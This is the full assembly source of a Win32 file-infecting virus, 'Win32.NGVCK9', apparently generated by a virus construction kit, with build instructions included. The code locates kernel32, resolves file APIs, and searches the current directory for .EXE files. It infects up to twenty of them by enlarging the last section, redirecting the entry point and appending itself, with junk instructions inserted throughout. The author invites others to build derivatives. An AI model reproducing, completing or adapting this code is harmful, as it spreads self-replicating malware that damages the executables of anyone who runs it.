              
;
;
; Win32.NGVCK9 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK9
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 22
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 mov ecx, dword ptr [esp]
                                        ; add esp, 4
 dec esp
 add esp, 5d
 sub ecx, offset Delta
                                        ; mov ebp, ecx
 push ecx
 pop ebp
 jmp KernelSearchStart


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldBase]
 pop edi

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], edi

                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ebx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retEIP dd 0h
 add edx,12345678h
 org $-4
 retBase dd 0h
 jmp edx



;                  [ ///// * Data * \\\\\ ]

Data:
 NewEIP      dd 0h
 db 'Win32.NGVCK9 created by SnakeByte',0
 filemask    db '*.EXE',0
 KernelPE    dd 0h
 AlignReg1   dd 0h
 MapAddress  dd 0h
 AlignTemp   dd 0h
 InfCounter  dd 0h
 FileHandle  dd 0h
 NewSize     dd 0h
 MapHandle   dd 0h

 APIOffsets:
 XCreateFileA           dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileMappingA    dd 0h
 XMapViewOfFile         dd 0h
 XFindNextFileA         dd 0h
 XCloseHandle           dd 0h
 XFindClose             dd 0h
 XUnmapViewOfFile       dd 0h


 APINames:
 db 11d, 'CreateFileA'
 db 14d, 'FindFirstFileA'
 db 18d, 'CreateFileMappingA'
 db 13d, 'MapViewOfFile'
 db 13d, 'FindNextFileA'
 db 11d, 'CloseHandle'
 db 09d, 'FindClose'
 db 15d, 'UnmapViewOfFile'

 FindHandle  dd 0h
 counter     dw 0h
 KernelMZ    dd 0h
 TempAPI     dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 OTableVA    dd 0h
 ATableVA    dd 0h
 TempApisearch2 dd 0h
 AlignReg2   dd 0h
 NTableVA    dd 0h
 TempApisearch1 dd 0h
 Trash1      dd 0h
 OldEIP      dd 0h
 OldBase     dd 400000h




;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 xor edx, edx
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignTemp], eax
 div ebx
 sub ebx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 sub ecx, 88963749d                     ; Trash
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ecx Lenght of API-Name
                                        ; esi Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



                                        ; clear edx
 mov edx, 41905d
 sub edx, 41905d
 add edx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ebx
 and ebx, 0
 add ebx, [edx+78h]
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 dec ebx
 add ebx, 29d
                                        ; get ATableVA
 mov edx, dword ptr [ebx]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edx
                                        ; add ebx, 4
 inc ebx
 add ebx, 3d
                                        ; get NTableVA
 mov edx, dword ptr [ebx]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edx
                                        ; add ebx, 4
 add ebx, 4d
                                        ; get OTableVA
 mov edx, dword ptr [ebx]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edx
 mov eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push eax
 mov ebx, dword ptr [ebp+KernelMZ]
 add ebx, dword ptr [eax]
 adc edx, 39003296d                     ; Trash
                                        ; mov eax, ebx
 mov eax, ebx
                                        ; mov edi, ebx
 push ebx
 pop edi
 push ecx
 pop dword ptr [ebp+TempApisearch1]
 mov dword ptr [ebp+TempApisearch2], edi
 push esi
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; esi Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov bl, byte ptr [edi]
 cmp bl, byte ptr [esi]
 jne ApiNotFound
 sub ecx, 1
 dec ecx
 inc ecx
 jz FoundApi1
                                        ; add esi, 1
 add esi, 1d
                                        ; add edi, 1
 add edi, 1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop esi
 pop eax
 push dword ptr [ebp+TempApisearch2]
 pop edi
                                        ; mov ecx, -1
 mov ecx, ( -1d xor 39d )
 xor ecx, 39d
 and ecx, dword ptr [ebp+TempApisearch1]
                                        ; add eax, 4
 add eax, 4d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop edi
 pop edi
                                        ; retrieve the offset
 movzx edx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 mov ebx, edx
 movzx edx, word ptr [ebx]
 clc
 rcl edx, 2h
 adc dword ptr [ebp+Trash1], ebx        ; Trash
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 push dword ptr [ebp+KernelMZ]
 pop ebx
 add ebx, dword ptr [edx]
 mov dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edx
 popad
 jmp ExecuteHost



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ebx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov edx, ebx
 add edx, [ebx+3Ch]
                                        ; get File Alignment
 mov ecx, [edx+3Ch]
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop edx
                                        ; calculate new size
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], ecx
 mov dword ptr [ebp+AlignReg1], edx
 call Align
                                        ; clear edx
 mov edx, 14242d
 sub edx, 14242d
 xor edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 xor dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 sbb eax, 6d                            ; Trash
 add dword ptr [ebp+WFD_nFileSizeLow], edx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, esi
 add ebx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 push ebx
 ror edx, 29d                           ; Trash
 pop esi
                                        ; get last section
                                        ; clear ecx
 mov ecx, -61100d
 add ecx, 61100d
 mov cx, word ptr [esi+06h]
 dec ecx
 imul ecx, ecx, 28h
                                        ; add ebx, 120
 add ebx, 120d
 add ebx, ecx
                                        ; clear edx
 sub edx, edx
 add edx, dword ptr [esi+74h]
 not eax                                ; Trash
 sal edx, 3
 add ebx, edx
                                        ; get old Entrypoint
 mov edx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], 0
 and ecx, 43642634d                     ; Trash
 add dword ptr [ebp+OldBase], edx
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], eax
                                        ; clear eax
 and eax, 0

 add eax, [ebx+10h]
                                        ; mov edx, eax
 mov edx, eax
 add eax, [ebx+14h]
 push eax
 mov ecx, edx
 add ebx, 0Ch
 add ecx, [ebx]
 sub ebx, 0Ch
 mov dword ptr [ebp+NewEIP], 0
 xor dword ptr [ebp+NewEIP], ecx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], ecx
 mov ecx, [ebx+10h]
 push ecx
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add ecx, VirusSize
 push ecx
 pop dword ptr [ebp+AlignReg1]
 call Align
                                        ; mov ecx, -1
 mov ecx, ( -1d + 21d )
 sub ecx, 21d
 and ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebx+10h], 0h
 add dword ptr [ebx+10h], ecx
 pop ecx
 add ecx,  (VirusSize-1510d)
 add ecx, 1510d
 mov dword ptr [ebx+08h], 0
 add dword ptr [ebx+08h], ecx
 mov ecx, dword ptr [ebx+10h]
 adc dword ptr [ebp+Trash1], 741058     ; Trash
 add ecx, dword ptr [ebx+0Ch]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], ecx
                                        ; set write, read and code flag
 or dword ptr [ebx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 and ebx, edx                           ; Trash
 mov ecx, VirusSize
 mov esi, offset Virus
 add esi, ebp

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
                                        ; clear ecx
 mov ecx, -47930d
 add ecx, 47930d
 xor ecx, dword ptr [ebp+InfCounter]
 sub ecx, 1
 mov dword ptr [ebp+InfCounter], -1
 and dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 stc
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea ecx, [ebp+filemask]
 xchg ecx, ebx

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 add eax, 1d
                                        ; add eax, 1
 sub eax, -1d
 dec eax
 jz EndInfectCurDir
                                        ; Set Infection Counter
 mov [ebp+InfCounter], 20d

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
                                        ; clear ecx
 push 0
 pop ecx
 xor ecx, dword ptr [ebp+InfCounter]
 or ecx, ecx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 pop esi
 or edx, 47265028d                      ; Trash
 push esi
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov edi, dword ptr [esp]
                                        ; round to pages
 xor di, di
                                        ; add edi, 1
 sub edi, -1d
GetKernelLoop:
                                        ; clear ebx
 mov ebx, 0
 sub edi, 1
 mov bx, word ptr [edi+03ch]
 test bx,0f800h
 jnz GetKernelLoop
 cmp edi, dword ptr [edi+ebx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], edi
 mov edx, edi
 add edx, [edi+3Ch]
 rcl ebx, 5d                            ; Trash
 mov [KernelPE+ebp], edx

 jmp GetApis

;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

                                        ; store old EIP and ImageBase
                                        ; clear esi
 push 0
 pop esi
 add esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], esi

                                        ; clear ecx
 mov ecx, 24269d
 sub ecx, 24269d
 add ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], ecx



                                        ; number of API's we're looking for
 push NumberOfApis
 pop eax

                                        ; load API Names and Offsets
 lea ebx, [ebp+APIOffsets]
 xchg ebx, edx

 lea ebx, [ebp+APINames]
 xchg esi, ebx


GetApisLoop: 

                                        ; clear ecx
 and ecx, 0
 mov cl, byte ptr [esi]
                                        ; add esi, 1
 sub esi, -1d

                                        ; search 'em
                                        ; ecx contains Name-Lenght
                                        ; esi points to the Name
                                        ; edx points to the offset
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

 call SearchAPI1
 and ebx, ebx                           ; Trash
 push esi
 add dword ptr [esp], ecx
 pop esi
                                        ; clear ebx
 and ebx, 0
 xor ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [edx], ebx
                                        ; add edx, 4
 add edx, 4d
 sub eax, 1
 jnz GetApisLoop
 jmp Outbreak



;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg esi, ecx

 push esi
 push ebx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 add dword ptr [ebp+FindHandle], eax
 mov edx, ebx                           ; Trash
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 sbb ebx, 22d                           ; Trash
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg ebx, ecx

 push ecx
 push dword ptr [ebp+FindHandle]
 pop eax
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov edx, 276
 mov edx, ( 276d - 7d )
 add edx, 7d
 lea ebx, [ebp+WFD_szFileName]


ClearOldData2:
 mov byte ptr [ebx], 0h
                                        ; add ebx, 1
 add ebx, 1d
 dec edx
 jnz ClearOldData2
 popad
ret





;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
                                        ; clear eax
 and eax, 0
 add eax, dword ptr [ebp+WFD_nFileSizeLow]
 cmp eax, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; mov edx, -1
 mov edx, -1d
 and edx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx ebx, word ptr [edx]
 cmp ebx, 'ZM'
 je Goodfile
                                        ; mov ecx, 17597
 push 17597d
 pop ecx
 or ecx, ecx
 jnz Notagoodfile
Goodfile:
                                        ; clear ebx
 push 0
 pop ebx
 mov bx, word ptr [edx+3Ch]
                                        ; add ebx, 1
 inc ebx
 sub ebx, 1
 jz Notagoodfile
 push dword ptr [edx+3Ch]
 pop ebx
                                        ; check if header lies inside the file
 cmp ebx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add ebx, edx
                                        ; check for PE Header
                                        ; check for EP
 movzx ecx, word ptr [ebx]
 xor ecx, 'EP'
 jz Goodfile2
                                        ; clear ecx
 mov ecx, 0
 test ecx, ecx
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ebx+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for DLL
 mov ax, word ptr [ebx+16h]
 and ax, 0F000h
 cmp ax, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret
 or eax, edx                            ; Trash




;        [ ///// * File Handling Procedure * \\\\\ ]

 xor eax, 75586833d                     ; Trash
                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear edx
 push 0
 pop edx

 push edx
 push edx
 push 3h
 push edx
                                        ; add edx, 1
 add edx, 1d
 push edx
 mov ecx, 80000000h or 40000000h
 push ecx
 lea edi, [ebp+WFD_szFileName]
 xchg edi, eax

 push eax
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx

                                        ; clear ebx
 mov ebx, 0
 push ebx
 push ecx
 push ebx
                                        ; mov edx, 4
 mov edx, ( 4d xor 27d )
 xor edx, 27d
 push edx
 push ebx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 push eax
 pop dword ptr [ebp+MapHandle]
 pop ecx
 test eax, eax
 jz CloseFile
 push ecx
 push 0
 push 0
                                        ; mov ebx, 2
 mov ebx, ( 2d + 19d )
 sub ebx, 19d
 push ebx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
                                        ; add eax, 1
 sub eax, -1d
 sub eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 xor dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

